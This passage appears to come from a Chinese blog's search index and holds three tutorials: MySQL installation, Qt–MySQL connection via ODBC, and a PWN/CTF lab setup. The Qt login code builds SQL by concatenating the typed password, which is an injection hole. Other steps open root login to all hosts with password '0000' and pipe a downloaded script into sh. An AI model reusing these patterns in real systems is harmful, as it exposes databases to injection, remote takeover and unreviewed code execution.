<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618908295769-1dc4acc4-da15-4405-85e5-cb105662c403.png" alt="img"></p>
<h2 id="2-启动与登录"><a href="#2-启动与登录" class="headerlink" title="2 启动与登录"></a>2 启动与登录</h2><ul>
<li><strong>启动：</strong><code>net start mysql</code> （同理 <code>net stop mysql</code> 可停止服务）（管理员身份）</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618908335828-17e2ab74-3c3f-4e23-be53-b53b206daf38.png" alt="img"></p>
<ul>
<li><p><strong>登录</strong></p>
<ul>
<li>登录本地：<code>mysql -u root -p</code> 然后输入上文得到的初始密码即可</li>
</ul>
</li>
<li><p><strong>注意：</strong>个人经验，最好在服务中将 MySQL 设置为手动（先命令行 net stop mysql 再将服务调整为手动）</p>
</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1621566205760-ead873af-6ad2-4029-b595-34f75f0a1c7b.png" alt="img"></p>
<h2 id="3-修改登录密码-2"><a href="#3-修改登录密码-2" class="headerlink" title="3 修改登录密码[2]"></a>3 修改登录密码[2]</h2><ul>
<li><strong>注意：这里在配置文件中添加的参数可能会导致关闭服务后就无法再启动服务了。所以不要按以下步骤修改密码</strong><ul>
<li><strong>启动服务 net start mysql (不能先停止服务再修改 ini 配置，否则会无法启动)</strong></li>
<li><strong>修改 ini</strong></li>
<li><strong>登录本地 MySQL</strong></li>
<li><strong>修改密码，退出登录</strong></li>
<li><strong>关闭服务 net stop mysql</strong></li>
<li><strong>删除此前添加的有关密码</strong></li>
</ul>
</li>
</ul>
<p>以上步骤完成后，启动服务发现修改后的密码可以使用了。更具体的部分细节如下</p>
<ul>
<li>修改配置文件 my.ini：在文件末尾追加两行参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加密码验证插件</span><br><span class="line">plugin-load-add=validate_password.so</span><br><span class="line">#服务器在启动时加载插件，并防止在服务器运行时删除插件</span><br><span class="line">validate-password=FORCE_PLUS_PERMANENT</span><br></pre></td></tr></table></figure>

<ul>
<li>root 登录本地 MySQL <code>mysql -u root -p</code> </li>
<li>将密码修改为 0000 </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;0000&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618910278709-526302e4-0e37-452c-a7ce-7c55df2a3c7e.png" alt="img"></p>
<ul>
<li>修改成功</li>
</ul>
<h2 id="4-关于重新安装"><a href="#4-关于重新安装" class="headerlink" title="4  关于重新安装"></a>4  关于重新安装</h2><ul>
<li>删除 MySQL 服务 <code>sc delete mysql</code></li>
<li>删除原先的 MySQL 目录，解压缩 zip 文件重新安装（上文步骤）</li>
</ul>
<p>如果还不能正常安装，参考下文方法</p>
<ul>
<li>某日发现不能正常启动 MySQL 服务，遂前往服务查看，当手动启动 MySQL 服务时会报错。故只得将<a href="https://blog.csdn.net/weixin_45450428/article/details/104643956?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&spm=1001.2101.3001.4242">原有 MySQL 文件和注册表中信息删除</a></li>
<li>但重新解压安装包，进行初始化时，会报错。解决方案也在其中，遂将 ini 文件中相关信息进行修改</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1619596939296-f8a921ef-80f3-4095-9d81-bda8ca98900b.png" alt="img"></p>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1619597004542-fd7661f2-7bf7-4b59-89a0-d53475b7e85b.png" alt="img"></p>
<ul>
<li>然后<strong>将 data 目录删除</strong>，即可正常初始化</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.runoob.com/mysql/mysql-install.html">https://www.runoob.com/mysql/mysql-install.html</a></li>
<li><a href="https://blog.csdn.net/qq_44792624/article/details/107426590">https://blog.csdn.net/qq_44792624/article/details/107426590</a></li>
</ol>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt 连接 MySQL</title>
    <url>/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/</url>
    <content><![CDATA[<h2 id="1-Qt-连接本地-MySQL-的方法-（Win）"><a href="#1-Qt-连接本地-MySQL-的方法-（Win）" class="headerlink" title="1 Qt 连接本地 MySQL 的方法 （Win）"></a>1 Qt 连接本地 MySQL 的方法 （Win）</h2><h3 id="1-1-前期准备"><a href="#1-1-前期准备" class="headerlink" title="1.1 前期准备"></a>1.1 前期准备</h3><h4 id="1-1-1-MySQL-安装"><a href="#1-1-1-MySQL-安装" class="headerlink" title="1.1.1 MySQL 安装"></a>1.1.1 MySQL 安装</h4><p><a href>MySQL的安装</a></p>
<h4 id="1-1-2-新建试验用的数据库和表"><a href="#1-1-2-新建试验用的数据库和表" class="headerlink" title="1.1.2 新建试验用的数据库和表"></a>1.1.2 新建试验用的数据库和表</h4><p>根据需要，自行新建数据库并添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database neuralinfo;</span><br><span class="line">use neuralinfo;</span><br><span class="line">create table users(user_name char(50), user_passwd char(50), primary key(user_name))engine=InnoDB;</span><br><span class="line">insert into users values(&#x27;info&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104152754.png" alt="image-20210527104152754"></p>
<h4 id="1-1-3-ODBC-安装"><a href="#1-1-3-ODBC-安装" class="headerlink" title="1.1.3 ODBC 安装"></a>1.1.3 ODBC 安装</h4><p><a href="https://blog.csdn.net/joey_ro/article/details/105411135">ODBC安装 参考</a></p>
<ul>
<li><a href="https://dev.mysql.com/downloads/connector/odbc/">官网下载</a> 根据指示安装即可</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527103810926.png" alt="image-20210527103810926"></p>
<ul>
<li><p>打开 ODBC 64</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527103907632.png" alt="image-20210527103907632"></p>
</li>
<li><p>添加用户 DSN，根据实际情况填写即可</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104308974.png" alt="image-20210527104308974"></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104415956.png" alt="image-20210527104415956"></p>
</li>
</ul>
<h3 id="1-2-Qt-连接数据库"><a href="#1-2-Qt-连接数据库" class="headerlink" title="1.2 Qt 连接数据库"></a>1.2 Qt 连接数据库</h3><p>这里，我们写了一个登录页面来试验 MySQL 的连接</p>
<h4 id="1-2-1-UI"><a href="#1-2-1-UI" class="headerlink" title="1.2.1 UI"></a>1.2.1 UI</h4><ul>
<li>主窗口如图，输入框均为 LineEdit</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104746481.png" alt="image-20210527104746481"></p>
<ul>
<li><p>用户名和口令正确，点击 Login 会进入子窗口，子窗口为空白窗口</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527105011886.png" alt="image-20210527105011886"></p>
</li>
</ul>
<h4 id="1-2-2-源码逻辑"><a href="#1-2-2-源码逻辑" class="headerlink" title="1.2.2 源码逻辑"></a>1.2.2 源码逻辑</h4><p><a href="https://github.com/woopokyuk/qtLogin">https://github.com/woopokyuk/qtLogin</a></p>
<p>pro 文件中需要 <code>QT+=sql</code></p>
<ul>
<li><p>必要头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlQuery&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br></pre></td></tr></table></figure></li>
<li><p>连接与语句执行方法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; QSqlDatabase::<span class="built_in">drivers</span>();</span><br><span class="line">ui-&gt;passwdLineEdit-&gt;<span class="built_in">setEchoMode</span>(QLineEdit::Password);</span><br><span class="line">QSqlDatabase db = QSqlDatabase::<span class="built_in">addDatabase</span>(<span class="string">&quot;QODBC&quot;</span>);</span><br><span class="line">db.<span class="built_in">setHostName</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">db.<span class="built_in">setPort</span>(<span class="number">3306</span>);</span><br><span class="line">db.<span class="built_in">setDatabaseName</span>(<span class="string">&quot;Neural&quot;</span>);  <span class="comment">// ODBC 中数据源的名称，不是 MySQL 中数据库的名称</span></span><br><span class="line">db.<span class="built_in">setUserName</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">db.<span class="built_in">setPassword</span>(<span class="string">&quot;0000&quot;</span>);  <span class="comment">// 数据库登录密码</span></span><br><span class="line">db.<span class="built_in">open</span>();</span><br><span class="line"><span class="keyword">if</span> (!db.<span class="built_in">open</span>()) &#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;db not open&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">QString passwd = ui-&gt;passwdLineEdit-&gt;<span class="built_in">text</span>();</span><br><span class="line">QString sqlLine = <span class="string">&quot;SELECT * FROM users WHERE user_passwd=&quot;</span> + passwd;</span><br><span class="line">QSqlQuery result = db.<span class="built_in">exec</span>(sqlLine);  <span class="comment">// 执行 MySQL 语句</span></span><br><span class="line">QString userNameInSql = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (result.<span class="built_in">next</span>()) &#123;</span><br><span class="line">    userNameInSql = result.<span class="built_in">value</span>(<span class="string">&quot;user_name&quot;</span>).<span class="built_in">toString</span>();</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; userNameInSql;</span><br><span class="line">&#125;</span><br><span class="line">QString inputUserName = ui-&gt;userLineEdit-&gt;<span class="built_in">text</span>();</span><br><span class="line"><span class="keyword">if</span>(userNameInSql == inputUserName &amp;&amp; inputUserName != <span class="string">&quot;&quot;</span>) &#123;  <span class="comment">// 验证用户名口令是否一致</span></span><br><span class="line">    test-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;User name or Password is wrong!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-Linux-Qt-连接远程-MySQL（Win）"><a href="#2-Linux-Qt-连接远程-MySQL（Win）" class="headerlink" title="2 Linux Qt 连接远程 MySQL（Win）"></a>2 Linux Qt 连接远程 MySQL（Win）</h2><hr>
<h3 id="2-1-Linux-下载安装-ODBC"><a href="#2-1-Linux-下载安装-ODBC" class="headerlink" title="2.1 Linux 下载安装 ODBC"></a>2.1 Linux 下载安装 ODBC</h3><h4 id="2-1-1-安装-unixODBC-和-ODBC"><a href="#2-1-1-安装-unixODBC-和-ODBC" class="headerlink" title="2.1.1 安装 unixODBC 和 ODBC"></a>2.1.1 安装 unixODBC 和 ODBC</h4><p>主要参考 <a href="https://blog.csdn.net/seakingx/article/details/87879164">https://blog.csdn.net/seakingx/article/details/87879164</a></p>
<ul>
<li><p>进行到 <code>sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0 Driver&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8w.so</code> 时，报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myodbc-installer: error while loading shared libraries: libodbc.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure></li>
</ul>
<p>原因：未按步骤安装 unixODBC，按以上参考顺序安装即可，若遇权限问题 sudo 无法解决 (如安装 unixODBC 过程中需要 make 但有权限问题 sudo 无法解决)，就 su 转 root 用户再执行指令</p>
<ul>
<li><p><strong>正确步骤：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> unixODBC 安装</span></span><br><span class="line">sudo wget ftp://ftp.unixodbc.org/pub/unixODBC/unixODBC-2.3.4.tar.gz</span><br><span class="line">tar -xvzf unixODBC-2.3.4.tar.gz </span><br><span class="line">cd unixODBC-2.3.4/</span><br><span class="line">sudo ./configure --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检验是否安装成功</span></span><br><span class="line">odbcinst -j </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> odbc 安装</span></span><br><span class="line">sudo tar zxvf mysql-connector-odbc-8.0.15-linux-ubuntu18.04-x86-64bit.tar.gz </span><br><span class="line">cd mysql-connector-odbc-8.0.15-linux-ubuntu18.04-x86-64bit/</span><br><span class="line">sudo cp bin/* /usr/local/bin</span><br><span class="line">sudo cp lib/* /usr/local/lib</span><br><span class="line"></span><br><span class="line">sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0 Driver&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8w.so&quot;</span><br><span class="line">sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8a.so&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证是否安装成功</span></span><br><span class="line">myodbc-installer -d -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置ODBC 参数</span></span><br><span class="line">sudo vi /etc/odbc.ini</span><br></pre></td></tr></table></figure></li>
<li><p>最终的 <code>/etc/odbc.ini</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Neural]</span><br><span class="line">Description     = Data source MySQL</span><br><span class="line">Driver          = MySQL ODBC 8.0 Driver</span><br><span class="line">Server          = x.x.x.x</span><br><span class="line">Host            = x.x.x.x</span><br><span class="line">Database        = xxxx</span><br><span class="line">Port            = 3306</span><br><span class="line">User            = root</span><br><span class="line">Password        = 0000</span><br></pre></td></tr></table></figure>

<ul>
<li>其中方括号内的是数据源名称，可以任意</li>
<li>Description 描述根据自己需要，任意填写</li>
<li>Driver 确定是 MySQL ODBC 8.0 Driver</li>
<li>Server 和 Host 均为 MySQL 的 IP</li>
<li>Database 为需要在 Linux 端使用的数据库</li>
</ul>
</li>
<li><p>以上步骤走完后，<code>isql Neural</code> 还是无法连接</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527160249814.png" alt="image-20210527160249814"></p>
</li>
<li><p>参考 <a href="https://blog.csdn.net/m0_37210884/article/details/114287684">https://blog.csdn.net/m0_37210884/article/details/114287684</a> 应该 <code>isql -v Neural root 0000</code> 指明数据库，用户名，密码</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527160522927.png" alt="image-20210527160522927"></p>
<p>结果报错不太一样了，其中指出机器不允许连接</p>
</li>
</ul>
<h4 id="2-1-2-解决上文的-S1000-连接问题"><a href="#2-1-2-解决上文的-S1000-连接问题" class="headerlink" title="2.1.2 解决上文的 S1000 连接问题"></a>2.1.2 解决上文的 S1000 连接问题</h4><p><a href="https://blog.csdn.net/weixin_42096620/article/details/110798766">参考</a></p>
<ul>
<li><p><strong>原因：</strong>root 用户只允许本地登录，细节如下</p>
<ul>
<li><p><code>use mysql;</code></p>
</li>
<li><p><code>SELECT user,host FROM user;</code></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162519904.png" alt="image-20210527162519904"></p>
</li>
</ul>
</li>
<li><p><strong>解决方法：</strong>将 root 对应的 host 改为 %，意即所有地址可访问。细节如下</p>
<ul>
<li><code>update user set host = &#39;%&#39; where user = &#39;root&#39;;</code> 更新访问权限</li>
<li><code>flush privileges;</code> 刷新访问权限表</li>
<li><code>select user,host from user;</code> 再查看 host 发现已经修改好了</li>
</ul>
</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162802153.png" alt="image-20210527162802153"></p>
<ul>
<li><p>结果：</p>
<ul>
<li><p>在 Linux 端 <code>isql -v Neural root 0000</code> 直接进入连接，并使用在 odbc.ini 中我们预先指定的数据库了</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162938228.png" alt="image-20210527162938228"></p>
</li>
<li><p><code>show tables;</code></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527163038271.png" alt="image-20210527163038271"></p>
</li>
</ul>
</li>
</ul>
<p>大功告成！</p>
<h3 id="2-2-Qt-中使用"><a href="#2-2-Qt-中使用" class="headerlink" title="2.2 Qt 中使用"></a>2.2 Qt 中使用</h3><p>上文已经可以在命令行中使用 ODBC 连接远程 MySQL 了，如何在 Qt 中连接呢</p>
<p>根据第 1 节的代码，类似的，我们在 Linux 环境下进行试验，当我们运行程序后，Qt 会报错 <code>QSqlDatabase: QODBC driver not loaded</code> 说明在连接 ODBC 驱动的数据库时，缺少了libqt4-sql-odbc驱动包</p>
<p><a href="https://blog.csdn.net/u012444155/article/details/16944393">解决方法参考</a></p>
<ul>
<li><code>sudo apt-get install libqt4-sql-odbc</code></li>
</ul>
<p>然后就可以成功连接啦！</p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN分析环境搭建</title>
    <url>/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p><a href="http://mirrors.163.com/ubuntu-releases/16.04/">http://mirrors.163.com/ubuntu-releases/16.04/</a> 这里下载 ubuntu-16.04.7-desktop-amd64.iso </p>
<ul>
<li>注意先建空白盘</li>
</ul>
<p><img src="/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210531154505963.png" alt="image-20210531154505963"></p>
<ul>
<li><p>建好后再通过设置，添加 ISO 映像文件</p>
<p><img src="/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210531154636268.png" alt="image-20210531154636268"></p>
</li>
<li><p>然后再启动虚拟机开始安装</p>
</li>
</ul>
<h2 id="二进制安全研究工具"><a href="#二进制安全研究工具" class="headerlink" title="二进制安全研究工具"></a>二进制安全研究工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt install libc6:i386</span><br><span class="line"></span><br><span class="line">sudo apt install gcc-4.8 cmake gdb socat vim</span><br><span class="line">sudo apt install python-dev python-pip python3 python3-dev python3-pip</span><br><span class="line"></span><br><span class="line">sudo pip install zio pwntools ropgadget capstone keystone-engine unicorn</span><br><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line">sudo wget https://github.com/slimm609/checksec.sh/raw/master/checksec -O /usr/local/bin/checksec &amp;&amp; sudo chmod +x /usr/local/bin/checksec</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
</search>
